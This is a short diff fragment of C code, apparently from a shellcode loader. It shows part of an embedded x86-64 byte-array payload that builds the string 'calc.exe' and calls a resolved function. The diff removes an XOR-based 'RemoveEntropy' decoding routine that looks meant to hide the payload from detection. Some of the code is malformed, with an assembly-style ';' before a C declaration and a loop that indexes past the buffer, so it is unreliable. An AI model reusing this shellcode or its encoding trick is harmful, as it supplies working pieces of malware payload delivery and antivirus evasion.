@@ -8,10 +8,4 @@ unsigned char embeded_payload[] =
 "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
 "\x48\x83\xec\x20\x41\xff\xd6"
 
-; int BUFFER_Size = 205;
-
-void RemoveEntropy()
-{
-    for (int i = 0; i < BUFFER_Size; i++)
-        embeded_payload[i] = embeded_payload[i] ^ (embeded_payload[i + BUFFER_Size] << 4);
-}
+; 
